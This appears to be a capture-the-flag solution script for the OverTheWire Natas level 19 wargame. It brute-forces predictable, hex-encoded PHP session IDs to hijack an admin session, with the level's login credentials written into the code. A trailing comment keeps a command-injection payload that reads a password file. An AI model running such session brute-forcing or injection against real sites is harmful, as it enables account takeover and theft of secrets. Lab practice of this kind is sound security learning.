from urllib import response

#3.9 pythonnal megy!!
import urllib
import requests
import re
import string
from time import *

username = 'natas19'
password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
for i in range(641):
    session = requests.Session()
    #reponse = session.post(url , data= {"username": "admin", "password": "letmei" }, auth=(username, password))
    print('Trying ...', str("%d-admin" % i ).encode('utf-8').hex())
    reponse = session.get(url, cookies={"PHPSESSID":str("%d-admin" % i ).encode('utf-8').hex()},auth=(username, password))
    content = reponse.text
    if "You are logged in as a regular user." not in content:
        print("Got it...")
        print(content)
        break
    

#phpsessid = session.cookies['PHPSESSID']
#print(bytes.fromhex(session.cookies['PHPSESSID']).decode('UTF-8'))



#$(grep b /etc/natas_webpass/natas17)